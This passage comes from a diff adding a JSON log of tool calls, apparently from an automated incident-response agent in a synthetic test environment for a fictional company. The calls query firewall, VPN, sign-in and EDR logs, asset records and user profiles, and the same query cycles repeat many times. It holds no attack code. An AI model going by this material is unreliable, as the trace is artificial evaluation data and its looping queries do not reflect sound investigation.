+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:30:09Z",
+        "hasta": "2026-10-10T00:50:09Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/PRINT01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 544,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:41:06Z",
+        "hasta": "2026-10-10T01:01:06Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/FS01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 611,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:55:00Z",
+        "hasta": "2026-10-10T01:15:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/FS01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 611,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:55:05Z",
+        "hasta": "2026-10-10T01:15:05Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/adm.aortega@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 495,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:idp_signins",
+      "args": {
+        "q": "adm.aortega",
+        "desde": "2026-10-09T01:05:36Z",
+        "hasta": "2026-10-11T01:05:36Z"
+      },
+      "origen": "incidentes",
+      "ms": 32,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:ad_events",
+      "args": {
+        "q": "adm.aortega",
+        "desde": "2026-10-09T01:05:36Z",
+        "hasta": "2026-10-11T01:05:36Z"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:edr_events",
+      "args": {
+        "q": "adm.aortega",
+        "desde": "2026-10-09T01:05:36Z",
+        "hasta": "2026-10-11T01:05:36Z"
+      },
+      "origen": "incidentes",
+      "ms": 45,
+      "chars": 5,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/FS01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 611,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:30:04Z",
+        "hasta": "2026-10-10T00:50:04Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/FS01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 611,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:30:09Z",
+        "hasta": "2026-10-10T00:50:09Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/PRINT01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 544,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:41:06Z",
+        "hasta": "2026-10-10T01:01:06Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/FS01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 611,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:55:00Z",
+        "hasta": "2026-10-10T01:15:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/FS01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 611,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-10T00:55:05Z",
+        "hasta": "2026-10-10T01:15:05Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/sergio.navarro@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 467,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:vpn",
+      "args": {
+        "q": "ext.logisoft",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "incidentes",
+      "ms": 33,
+      "chars": 30,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.99.60.10",
+        "desde": "2026-10-11T01:38:00Z",
+        "hasta": "2026-10-11T05:38:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/ricard.castells@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 663,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.95.154"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 274,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/irene.castells@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 450,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/celia.coll@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 434,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/oriol.lopez@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 435,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/andrea.molina2@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 453,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:idp_signins",
+      "args": {
+        "q": "svc_backup",
+        "desde": "2026-10-12T01:18:04Z",
+        "hasta": "2026-10-14T01:18:04Z"
+      },
+      "origen": "incidentes",
+      "ms": 51,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:vpn",
+      "args": {
+        "q": "svc_backup",
+        "desde": "2026-10-12T01:18:04Z",
+        "hasta": "2026-10-14T01:18:04Z"
+      },
+      "origen": "incidentes",
+      "ms": 6,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/87.118.116.103"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 569,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:edr_events",
+      "args": {
+        "q": "svc_backup",
+        "desde": "2026-10-12T01:18:04Z",
+        "hasta": "2026-10-14T01:18:04Z"
+      },
+      "origen": "incidentes",
+      "ms": 65,
+      "chars": 5,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/svc_backup@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 530,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/alba.aguilar@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 433,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:idp_signins",
+      "args": {
+        "q": "adm.dnavarro",
+        "desde": "2026-10-12T08:31:43Z",
+        "hasta": "2026-10-14T08:31:43Z"
+      },
+      "origen": "incidentes",
+      "ms": 53,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:ad_events",
+      "args": {
+        "q": "adm.dnavarro",
+        "desde": "2026-10-12T08:31:43Z",
+        "hasta": "2026-10-14T08:31:43Z"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:edr_events",
+      "args": {
+        "q": "adm.dnavarro",
+        "desde": "2026-10-12T08:31:43Z",
+        "hasta": "2026-10-14T08:31:43Z"
+      },
+      "origen": "incidentes",
+      "ms": 65,
+      "chars": 4,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/ERP-APP01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 365,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:20:00Z",
+        "hasta": "2026-10-13T08:40:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/HR-APP01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 370,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:26:00Z",
+        "hasta": "2026-10-13T08:46:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/PRINT01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 544,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:32:00Z",
+        "hasta": "2026-10-13T08:52:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/CRM-APP01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 389,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:38:00Z",
+        "hasta": "2026-10-13T08:58:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/adm.dnavarro@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 489,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:idp_signins",
+      "args": {
+        "q": "adm.dnavarro",
+        "desde": "2026-10-12T08:38:09Z",
+        "hasta": "2026-10-14T08:38:09Z"
+      },
+      "origen": "incidentes",
+      "ms": 48,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:ad_events",
+      "args": {
+        "q": "adm.dnavarro",
+        "desde": "2026-10-12T08:38:09Z",
+        "hasta": "2026-10-14T08:38:09Z"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:edr_events",
+      "args": {
+        "q": "adm.dnavarro",
+        "desde": "2026-10-12T08:38:09Z",
+        "hasta": "2026-10-14T08:38:09Z"
+      },
+      "origen": "incidentes",
+      "ms": 65,
+      "chars": 4,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/ERP-APP01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 365,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:20:00Z",
+        "hasta": "2026-10-13T08:40:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/HR-APP01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 370,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:26:00Z",
+        "hasta": "2026-10-13T08:46:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/PRINT01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 544,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:32:00Z",
+        "hasta": "2026-10-13T08:52:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/CRM-APP01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 389,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:38:00Z",
+        "hasta": "2026-10-13T08:58:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:idp_signins",
+      "args": {
+        "q": "adm.dnavarro",
+        "desde": "2026-10-12T08:46:55Z",
+        "hasta": "2026-10-14T08:46:55Z"
+      },
+      "origen": "incidentes",
+      "ms": 48,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:ad_events",
+      "args": {
+        "q": "adm.dnavarro",
+        "desde": "2026-10-12T08:46:55Z",
+        "hasta": "2026-10-14T08:46:55Z"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:edr_events",
+      "args": {
+        "q": "adm.dnavarro",
+        "desde": "2026-10-12T08:46:55Z",
+        "hasta": "2026-10-14T08:46:55Z"
+      },
+      "origen": "incidentes",
+      "ms": 65,
+      "chars": 4,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/ERP-APP01"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 365,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:20:00Z",
+        "hasta": "2026-10-13T08:40:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/HR-APP01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 370,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:26:00Z",
+        "hasta": "2026-10-13T08:46:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/PRINT01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 544,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:32:00Z",
+        "hasta": "2026-10-13T08:52:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/CRM-APP01"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 389,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:38:00Z",
+        "hasta": "2026-10-13T08:58:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:idp_signins",
+      "args": {
+        "q": "adm.dnavarro",
+        "desde": "2026-10-12T08:50:11Z",
+        "hasta": "2026-10-14T08:50:11Z"
+      },
+      "origen": "incidentes",
+      "ms": 61,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:ad_events",
+      "args": {
+        "q": "adm.dnavarro",
+        "desde": "2026-10-12T08:50:11Z",
+        "hasta": "2026-10-14T08:50:11Z"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:edr_events",
+      "args": {
+        "q": "adm.dnavarro",
+        "desde": "2026-10-12T08:50:11Z",
+        "hasta": "2026-10-14T08:50:11Z"
+      },
+      "origen": "incidentes",
+      "ms": 66,
+      "chars": 4,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/ERP-APP01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 365,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:20:00Z",
+        "hasta": "2026-10-13T08:40:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/HR-APP01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 370,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:26:00Z",
+        "hasta": "2026-10-13T08:46:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/PRINT01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 544,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:32:00Z",
+        "hasta": "2026-10-13T08:52:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "activo",
+      "args": {
+        "ruta": "/assets/CRM-APP01"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 389,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.20.6.61",
+        "desde": "2026-10-13T08:38:00Z",
+        "hasta": "2026-10-13T08:58:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 3,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/adria.soler@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 432,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:vpn",
+      "args": {
+        "q": "ext.logisoft",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "incidentes",
+      "ms": 33,
+      "chars": 30,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.99.60.77",
+        "desde": "2026-10-13T16:35:00Z",
+        "hasta": "2026-10-13T20:35:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:vpn",
+      "args": {
+        "q": "ext.logisoft",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "incidentes",
+      "ms": 34,
+      "chars": 30,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.99.60.11",
+        "desde": "2026-10-13T23:35:00Z",
+        "hasta": "2026-10-14T03:35:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/eva.sanz@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 428,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/carlos.sanchez@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 450,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/nuria.vidal@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 660,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/marina.munoz@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 587,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/andrea.font@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 580,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/raul.blanco@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 437,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/paula.nunez@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 435,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/judith.fernandez@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 456,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:vpn",
+      "args": {
+        "q": "ext.logisoft",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "incidentes",
+      "ms": 33,
+      "chars": 30,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.99.60.90",
+        "desde": "2026-10-16T20:10:00Z",
+        "hasta": "2026-10-17T00:10:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:vpn",
+      "args": {
+        "q": "ext.logisoft",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "incidentes",
+      "ms": 34,
+      "chars": 30,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.99.60.12",
+        "desde": "2026-10-18T00:46:00Z",
+        "hasta": "2026-10-18T04:46:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:idp_signins",
+      "args": {
+        "q": "adm.aortega",
+        "desde": "2026-10-17T01:16:59Z",
+        "hasta": "2026-10-19T01:16:59Z"
+      },
+      "origen": "incidentes",
+      "ms": 16,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:ad_events",
+      "args": {
+        "q": "adm.aortega",
+        "desde": "2026-10-17T01:16:59Z",
+        "hasta": "2026-10-19T01:16:59Z"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 2,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:edr_events",
+      "args": {
+        "q": "adm.aortega",
+        "desde": "2026-10-17T01:16:59Z",
+        "hasta": "2026-10-19T01:16:59Z"
+      },
+      "origen": "incidentes",
+      "ms": 21,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/svc_print_upd@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 440,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/montse.munoz@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 440,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/clara.llorens@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 437,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/cristina.benitez@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 446,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/hugo.iglesias@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 437,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/alba.sanz@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 441,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/lucia.castro@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 444,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/silvia.lopez@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 431,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/beatriz.pena@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 440,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/daniel.diaz@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 427,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/marina.gomez@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 438,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/irene.font3@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 440,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/cristina.romero@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 0,
+      "chars": 446,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/beatriz.ortega@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 445,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/carmen.vidal@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 439,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/paula.ramos@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 0,
+      "chars": 427,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/alejandro.ruiz@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 456,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/sergio.reyes@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 439,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/alejandro.ramos@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 453,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/alba.ferrer@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 430,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:vpn",
+      "args": {
+        "q": "ext.logisoft",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "incidentes",
+      "ms": 33,
+      "chars": 30,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
